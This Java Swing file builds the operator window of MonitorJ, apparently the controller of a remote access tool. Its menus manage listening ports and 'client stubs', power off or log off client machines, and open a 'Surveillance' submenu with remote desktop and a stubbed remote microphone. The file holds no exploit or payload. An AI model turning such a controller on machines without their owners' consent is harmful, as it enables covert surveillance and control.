package me.jershdervis.monitorj.ui;

import me.jershdervis.monitorj.MonitorJ;
import me.jershdervis.monitorj.server.BaseServerClient;
import me.jershdervis.monitorj.server.Packets;
import me.jershdervis.monitorj.server.ServerManager;
import me.jershdervis.monitorj.ui.components.AddSocketForm;
import me.jershdervis.monitorj.ui.components.RemoteChatFrame;
import me.jershdervis.monitorj.ui.components.RemoteDesktopFrame;
import me.jershdervis.monitorj.util.ResourceLoader;

import javax.swing.*;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableCellRenderer;
import java.awt.event.MouseEvent;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by Josh on 18/06/2015.
 */
public class UserInterface extends javax.swing.JFrame {

    private final AddSocketForm addSocketForm;

    /**
     * Creates new form UserInterface
     */
    public UserInterface() {
        initComponents();
        this.addSocketForm = new AddSocketForm(this);
        MonitorJ.getInstance().EVENT_UI_LOADED.call(this);
    }

    private void initComponents() {
        clientOptionMenu = new javax.swing.JPopupMenu();
        socketOptionMenu = new javax.swing.JPopupMenu();
        jTabbedPane1 = new javax.swing.JTabbedPane();
        clientPanel = new javax.swing.JPanel();
        jScrollPane1 = new javax.swing.JScrollPane();

        clientListTable = new javax.swing.JTable();

        compilerPanel = new javax.swing.JPanel();
        pluginCenterPanel = new javax.swing.JPanel();
        jScrollPane3 = new javax.swing.JScrollPane();
        pluginCenterTable = new javax.swing.JTable();
        socketManagerPanel = new javax.swing.JPanel();
        jScrollPane2 = new javax.swing.JScrollPane();
        socketTable = new javax.swing.JTable();
        addSocketButton = new javax.swing.JButton();
        removeSocketButton = new javax.swing.JButton();
        removeSocketButton.setEnabled(false);

        ShutdownHook shutdownHook = new ShutdownHook();
        Runtime.getRuntime().addShutdownHook(shutdownHook);

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("MonitorJ v0.1");
        setIconImage(ResourceLoader.FORM_ICON.getImage());

        clientListTable.setModel(new ClientTableModel());
        clientListTable.setDefaultRenderer(JLabel.class, new ClientTableCellRenderer());

        clientListTable.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                if (evt.isPopupTrigger())
                    showClientPopupMenu(evt);
            }

            public void mouseReleased(java.awt.event.MouseEvent evt) {
                if (evt.isPopupTrigger())
                    showClientPopupMenu(evt);
            }
        });
        jScrollPane1.setViewportView(clientListTable);

        javax.swing.GroupLayout clientPanelLayout = new javax.swing.GroupLayout(clientPanel);
        clientPanel.setLayout(clientPanelLayout);
        clientPanelLayout.setHorizontalGroup(
                clientPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 695, Short.MAX_VALUE)
        );
        clientPanelLayout.setVerticalGroup(
                clientPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(jScrollPane1, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 372, Short.MAX_VALUE)
        );
        jTabbedPane1.setFocusable(false); //No dotted selection box around tab
        jTabbedPane1.addTab("Client List", ResourceLoader.TAB_CLIENT_LIST, clientPanel);

        //Loads all right click on client options
        this.loadClientPopupMenu();

        javax.swing.GroupLayout compilerPanelLayout = new javax.swing.GroupLayout(compilerPanel);
        compilerPanel.setLayout(compilerPanelLayout);
        compilerPanelLayout.setHorizontalGroup(
                compilerPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addGap(0, 695, Short.MAX_VALUE)
        );
        compilerPanelLayout.setVerticalGroup(
                compilerPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addGap(0, 372, Short.MAX_VALUE)
        );

        jTabbedPane1.addTab("Compiler", ResourceLoader.TAB_COMPILER, compilerPanel);

        pluginCenterTable.setModel(new javax.swing.table.DefaultTableModel(
                new Object[][]{

                },
                new String[]{
                        "Icon", "Name", "Description", "Authors", "Version"
                }
        ) {
            Class[] types = new Class[]{
                    java.lang.Object.class, java.lang.String.class, java.lang.String.class, java.lang.String.class, java.lang.Double.class
            };
            boolean[] canEdit = new boolean[]{
                    false, false, false, false, false
            };

            public Class getColumnClass(int columnIndex) {
                return types[columnIndex];
            }

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return canEdit[columnIndex];
            }
        });
        jScrollPane3.setViewportView(pluginCenterTable);

        javax.swing.GroupLayout pluginCenterPanelLayout = new javax.swing.GroupLayout(pluginCenterPanel);
        pluginCenterPanel.setLayout(pluginCenterPanelLayout);
        pluginCenterPanelLayout.setHorizontalGroup(
                pluginCenterPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(jScrollPane3, javax.swing.GroupLayout.DEFAULT_SIZE, 695, Short.MAX_VALUE)
        );
        pluginCenterPanelLayout.setVerticalGroup(
                pluginCenterPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(jScrollPane3, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, 372, Short.MAX_VALUE)
        );

        jTabbedPane1.addTab("Plugin Center", ResourceLoader.TAB_PLUGIN_CENTER, pluginCenterPanel);

        socketTable.setModel(new javax.swing.table.DefaultTableModel(
                new Object[][]{

                },
                new String[]{
                        "Name", "Port", "Description"
                }
        ) {
            boolean[] canEdit = new boolean[]{
                    false, false, false
            };

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return canEdit[columnIndex];
            }
        });
        socketTable.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                socketTableMousePressed(evt);
            }

            public void mouseReleased(java.awt.event.MouseEvent evt) {
                socketTableMouseReleased(evt);
            }
        });
        socketTable.getSelectionModel().addListSelectionListener(event -> SwingUtilities.invokeLater(() -> removeSocketButton.setEnabled(true)));

        jScrollPane2.setViewportView(socketTable);

        addSocketButton.setIcon(ResourceLoader.BUTTON_SOCKET_ADD);
        addSocketButton.setText("Add Socket");
        addSocketButton.setPreferredSize(new java.awt.Dimension(107, 23));
        addSocketButton.addActionListener(evt -> addSocketButtonActionPerformed(evt));

        removeSocketButton.setIcon(ResourceLoader.BUTTON_SOCKET_REMOVE);
        removeSocketButton.setText("Close Socket");
        removeSocketButton.addActionListener(evt -> removeSocketButtonActionPerformed(evt));

        javax.swing.GroupLayout socketManagerPanelLayout = new javax.swing.GroupLayout(socketManagerPanel);
        socketManagerPanel.setLayout(socketManagerPanelLayout);
        socketManagerPanelLayout.setHorizontalGroup(
                socketManagerPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 695, Short.MAX_VALUE)
                        .addGroup(socketManagerPanelLayout.createSequentialGroup()
                                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .addComponent(addSocketButton, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(removeSocketButton)
                                .addContainerGap())
        );
        socketManagerPanelLayout.setVerticalGroup(
                socketManagerPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addGroup(socketManagerPanelLayout.createSequentialGroup()
                                .addComponent(jScrollPane2, javax.swing.GroupLayout.DEFAULT_SIZE, 327, Short.MAX_VALUE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                .addGroup(socketManagerPanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                                        .addComponent(addSocketButton, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                                        .addComponent(removeSocketButton))
                                .addContainerGap())
        );

        jTabbedPane1.addTab("Socket Manager", ResourceLoader.TAB_SOCKET_MANAGER, socketManagerPanel);

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
                layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(jTabbedPane1)
        );
        layout.setVerticalGroup(
                layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                        .addComponent(jTabbedPane1)
        );

        pack();
    }

    private void addSocketButtonActionPerformed(java.awt.event.ActionEvent evt) {
        addSocketForm.setLocationRelativeTo(null);
        addSocketForm.setVisible(true);
    }

    private void removeSocketButtonActionPerformed(java.awt.event.ActionEvent evt) {
        int[] selectedRows = socketTable.getSelectedRows();
        if (socketTable.getSelectedRow() != -1) {
            int dialogResult = JOptionPane.showConfirmDialog(null, "Are you sure you'd like to stop listening on " + selectedRows.length + " port(s)?", "Are you sure?", JOptionPane.YES_NO_OPTION);
            if (dialogResult == JOptionPane.YES_OPTION) {
                for(int currentPort : getSelectedPorts()) {
                    System.out.println("Closing port: " + currentPort);
                    ServerManager.instance.closeServerOnPort(currentPort);
                    MonitorJ.getInstance().getFileManager().removeSocketValue(currentPort);
                    ((DefaultTableModel) socketTable.getModel()).removeRow(socketTable.getSelectedRow());
                }
                SwingUtilities.invokeLater(() -> removeSocketButton.setEnabled(false));
            }
        }
    }

    private List<Integer> getSelectedPorts() {
        List<Integer> ports = new ArrayList<Integer>();
        for(int current : socketTable.getSelectedRows())
            ports.add(Integer.parseInt(socketTable.getModel().getValueAt(current, 1).toString()));
        return ports;
    }

    private void socketTableMousePressed(java.awt.event.MouseEvent evt) {
        int r = socketTable.rowAtPoint(evt.getPoint());
        if (r >= 0 && r < socketTable.getRowCount())
            socketTable.setRowSelectionInterval(r, r);
        else
            socketTable.clearSelection();

        if (socketTable.getSelectedRow() < 0)
            return;
        if (evt.isPopupTrigger() && evt.getComponent() instanceof javax.swing.JTable)
            socketOptionMenu.show(evt.getComponent(), evt.getX(), evt.getY());
    }

    private void socketTableMouseReleased(java.awt.event.MouseEvent evt) {
        if (evt.isPopupTrigger() && evt.getComponent() instanceof javax.swing.JTable)
            socketOptionMenu.show(evt.getComponent(), evt.getX(), evt.getY());
    }

    private void showClientPopupMenu(MouseEvent e) {
        if(clientListTable.getSelectedRows().length <= 1) {
            int rowNumber = clientListTable.rowAtPoint(e.getPoint());
            ListSelectionModel model = clientListTable.getSelectionModel();
            model.setSelectionInterval(rowNumber, rowNumber);
        }

        if (e.isPopupTrigger() && e.getComponent() instanceof javax.swing.JTable)
            clientOptionMenu.show(clientListTable, e.getX(), e.getY());
    }

    private void loadClientPopupMenu() {
        JMenu connectionSubMenu = new JMenu("Connection");
        connectionSubMenu.setIcon(ResourceLoader.CLIENT_CONNECTION_MENU);

        JMenuItem restartClientApp = new JMenuItem("Restart", ResourceLoader.CLIENT_CONNECTION_RESTART);
        restartClientApp.addActionListener(evt -> {
            int dialogResult = JOptionPane.showConfirmDialog(null, "Are you sure you'd like to restart the selected client stub(s)?", "Are you sure?", JOptionPane.YES_NO_OPTION);
            if(dialogResult == JOptionPane.YES_OPTION)
                this.runPacketOnAllSelectedClients(Packets.RESTART_CLIENT_APPLICATION.getPacketID());
        });
        JMenuItem disconnectClient = new JMenuItem("Disconnect", ResourceLoader.CLIENT_CONNECTION_DISCONNECT);
        disconnectClient.addActionListener(evt -> {
            int dialogResult = JOptionPane.showConfirmDialog(null, "Are you sure you'd like to disconnect the selected client stub(s)?", "Are you sure?", JOptionPane.YES_NO_OPTION);
            if(dialogResult == JOptionPane.YES_OPTION)
                this.runPacketOnAllSelectedClients(Packets.DISCONNECT_CLIENT.getPacketID());
        });
        JMenuItem shutdownClientApp = new JMenuItem("Shutdown", ResourceLoader.CLIENT_CONNECTION_SHUTDOWN);
        shutdownClientApp.addActionListener(evt -> {
            int dialogResult = JOptionPane.showConfirmDialog(null, "Are you sure you'd like to shutdown the selected client stub(s)?", "Are you sure?", JOptionPane.YES_NO_OPTION);
            if(dialogResult == JOptionPane.YES_OPTION)
                this.runPacketOnAllSelectedClients(Packets.SHUTDOWN_CLIENT_APPLICATION.getPacketID());
        });
        JMenuItem uninstallClientApp = new JMenuItem("Uninstall", ResourceLoader.CLIENT_CONNECTION_UNINSTALL);
        uninstallClientApp.addActionListener(evt -> {
            int dialogResult = JOptionPane.showConfirmDialog(null, "Are you sure you'd like to uninstall the selected client stub(s)?", "Are you sure?", JOptionPane.YES_NO_OPTION);
            if(dialogResult == JOptionPane.YES_OPTION)
                this.runPacketOnAllSelectedClients(Packets.UNINSTALL_CLIENT_APPLICATION.getPacketID());
        });

        JMenu systemSubMenu = new JMenu("System");
        systemSubMenu.setIcon(ResourceLoader.CLIENT_SYSTEM_MENU);

        JMenuItem sleepClientSystem = new JMenuItem("Sleep", ResourceLoader.CLIENT_SYSTEM_SLEEP);
        sleepClientSystem.addActionListener(evt -> {
            int dialogResult = JOptionPane.showConfirmDialog(null, "Are you sure you'd like to put the selected client computer(s) to sleep?", "Are you sure?", JOptionPane.YES_NO_OPTION);
            if(dialogResult == JOptionPane.YES_OPTION)
                this.runPacketOnAllSelectedClients(Packets.SLEEP_CLIENT_SYSTEM.getPacketID());
        });
        JMenuItem logoffClientSystem = new JMenuItem("Log Off", ResourceLoader.CLIENT_SYSTEM_LOGOFF);
        logoffClientSystem.addActionListener(evt -> {
            int dialogResult = JOptionPane.showConfirmDialog(null, "Are you sure you'd like to logoff the selected client computer(s)?", "Are you sure?", JOptionPane.YES_NO_OPTION);
            if(dialogResult == JOptionPane.YES_OPTION)
                this.runPacketOnAllSelectedClients(Packets.LOGOFF_CLIENT_SYSTEM.getPacketID());
        });
        JMenuItem restartClientSystem = new JMenuItem("Reboot", ResourceLoader.CLIENT_SYSTEM_RESTART);
        restartClientSystem.addActionListener(evt -> {
            int dialogResult = JOptionPane.showConfirmDialog(null, "Are you sure you'd like to reboot the selected client computer(s)?", "Are you sure?", JOptionPane.YES_NO_OPTION);
            if(dialogResult == JOptionPane.YES_OPTION)
                this.runPacketOnAllSelectedClients(Packets.RESTART_CLIENT_SYSTEM.getPacketID());
        });
        JMenuItem shutdownClientSystem = new JMenuItem("Shutdown", ResourceLoader.CLIENT_SYSTEM_SHUTDOWN);
        shutdownClientSystem.addActionListener(evt -> {
            int dialogResult = JOptionPane.showConfirmDialog(null, "Are you sure you'd like to shutdown the selected client computer(s)?", "Are you sure?", JOptionPane.YES_NO_OPTION);
            if(dialogResult == JOptionPane.YES_OPTION)
                this.runPacketOnAllSelectedClients(Packets.SHUTDOWN_CLIENT_SYSTEM.getPacketID());
        });
        //

        JMenu surveillanceSubMenu = new JMenu("Surveillance");
        surveillanceSubMenu.setIcon(ResourceLoader.CLIENT_SURVEILLANCE_MENU);

        JMenuItem remoteDesktop = new JMenuItem("Remote Desktop", ResourceLoader.CLIENT_SURVEILLANCE_REMOTE_DESKTOP);
        remoteDesktop.addActionListener(evt -> {
            BaseServerClient selectedClient = ServerManager.instance.getClientBySelectedRow();
            selectedClient.getRemoteDesktopFrame().setTitle("Remote Desktop with " + selectedClient.CLIENT_PC_NAME + ":" + selectedClient.CLIENT_USER_NAME);
            selectedClient.getRemoteDesktopFrame().setVisible(true);
        });

        //TODO: Create Remote Microphone listener and UI
        JMenuItem remoteMic = new JMenuItem("Remote Microphone", ResourceLoader.CLIENT_SURVEILLANCE_REMOTE_MIC);
        remoteDesktop.addActionListener(evt -> {
            BaseServerClient selectedClient = ServerManager.instance.getClientBySelectedRow();

        });//

        JMenu toolsSubMenu = new JMenu("Tools");
        toolsSubMenu.setIcon(ResourceLoader.CLIENT_TOOLS_MENU);

        JMenuItem remoteChat = new JMenuItem("Remote Chat", ResourceLoader.CLIENT_TOOLS_REMOTE_CHAT);
        remoteChat.addActionListener(evt -> {
            BaseServerClient selectedClient = MonitorJ.getInstance().getServerManager().getClientBySelectedRow();
            selectedClient.getRemoteChatFrame().setTitle("Remote Chat with " + selectedClient.CLIENT_PC_NAME + ":" + selectedClient.CLIENT_USER_NAME);
            try {
                selectedClient.getDataOutputStream().writeByte(Packets.REMOTE_CHAT_START.getPacketID());
            } catch (IOException e) {
                e.printStackTrace();
            }
            selectedClient.getRemoteChatFrame().setVisible(true);
        });

        connectionSubMenu.add(restartClientApp);
        connectionSubMenu.add(disconnectClient);
        connectionSubMenu.add(shutdownClientApp);
        connectionSubMenu.add(uninstallClientApp);
        clientOptionMenu.add(connectionSubMenu);

        systemSubMenu.add(sleepClientSystem);
        systemSubMenu.add(logoffClientSystem);
        systemSubMenu.add(restartClientSystem);
        systemSubMenu.add(shutdownClientSystem);
        clientOptionMenu.add(systemSubMenu);

        surveillanceSubMenu.add(remoteDesktop);
        surveillanceSubMenu.add(remoteMic);
        clientOptionMenu.add(surveillanceSubMenu);

        toolsSubMenu.add(remoteChat);
        clientOptionMenu.add(toolsSubMenu);
    }

    private void runPacketOnAllSelectedClients(int packetID) {
        ArrayList<BaseServerClient> clients = ServerManager.instance.getAllSelectedClients();
        for(BaseServerClient client : clients) {
            try {
                client.getDataOutputStream().writeByte(packetID);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    private javax.swing.JButton addSocketButton;
    public javax.swing.JTable clientListTable;
    private javax.swing.JPopupMenu clientOptionMenu;
    private javax.swing.JPanel clientPanel;
    private javax.swing.JPanel compilerPanel;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JScrollPane jScrollPane3;
    private javax.swing.JTabbedPane jTabbedPane1;
    private javax.swing.JPanel pluginCenterPanel;
    public javax.swing.JTable pluginCenterTable;
    private javax.swing.JButton removeSocketButton;
    private javax.swing.JPanel socketManagerPanel;
    public javax.swing.JPopupMenu socketOptionMenu;
    public javax.swing.JTable socketTable;
}
